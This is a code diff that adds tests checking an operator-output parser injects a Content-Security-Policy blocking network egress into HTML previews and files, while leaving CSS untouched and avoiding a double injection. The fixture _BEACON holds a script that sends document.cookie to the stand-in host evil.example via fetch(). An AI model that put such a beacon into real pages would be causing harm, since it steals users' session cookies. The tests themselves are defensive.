@@ -338,3 +338,51 @@ def test_oversize_html_payloads_are_clamped() -> None:
 def test_an_oversize_file_path_is_clamped_not_dropped() -> None:
     out = parse_operator_output(_response(artifact={"files": [{"path": "p" * 5_000, "content": "x"}]}))
     assert len(out["artifact"]["files"][0]["path"]) == 200  # ArtifactFile.path's max_length
+
+
+# The half of the artifact CSP that this module exists to get in front of an
+# operator's HTML: the sandbox attribute already blocks parent access, but
+# nothing stopped a preview from beaconing out of the frame until the policy
+# was injected. Matching on the directive rather than the whole header keeps
+# the test from re-pinning code_validator's wording.
+_NO_EGRESS = "connect-src 'none'"
+_CSP = "Content-Security-Policy"
+
+_BEACON = "<html><head></head><body><script>fetch('https://evil.example/?c='+document.cookie)</script></body></html>"
+
+
+def test_operator_preview_html_is_hardened() -> None:
+    # External HTML goes through harden_artifact exactly as a local artifact
+    # does. Today only code_gen and code_critic call it, which is precisely why
+    # an operator's preview reached the viewer's srcDoc unsealed.
+    out = parse_operator_output(_response(artifact={"preview_html": _BEACON}))
+    preview = out["artifact"]["preview_html"]
+
+    assert _CSP in preview
+    assert _NO_EGRESS in preview
+    # And it lands BEFORE the operator's script: a policy the parser reaches
+    # after the code it is meant to constrain is decoration.
+    assert preview.index(_CSP) < preview.index("<script")
+
+
+def test_operator_html_files_are_hardened_too() -> None:
+    # The downloadable file is the same document the buyer can open locally, so
+    # it carries the same policy — and this is also what keeps the
+    # preview_html == files[entry].content contract honest.
+    out = parse_operator_output(_response(artifact={"files": [{"path": "index.html", "content": _BEACON}]}))
+    assert _NO_EGRESS in out["artifact"]["files"][0]["content"]
+
+
+def test_a_non_html_file_is_left_alone() -> None:
+    # Hardening keys off the path suffix (we drop the operator's `language`),
+    # and a CSP <meta> injected into a stylesheet would corrupt it.
+    out = parse_operator_output(_response(artifact={"files": [{"path": "app.css", "content": "body{color:red}"}]}))
+    assert out["artifact"]["files"][0]["content"] == "body{color:red}"
+
+
+def test_hardening_is_not_applied_twice() -> None:
+    # An operator replaying our own hardened output back at us must not end up
+    # with two policies stapled to the document.
+    once = parse_operator_output(_response(artifact={"preview_html": _BEACON}))["artifact"]["preview_html"]
+    twice = parse_operator_output(_response(artifact={"preview_html": once}))["artifact"]["preview_html"]
+    assert twice.count(_CSP) == 1
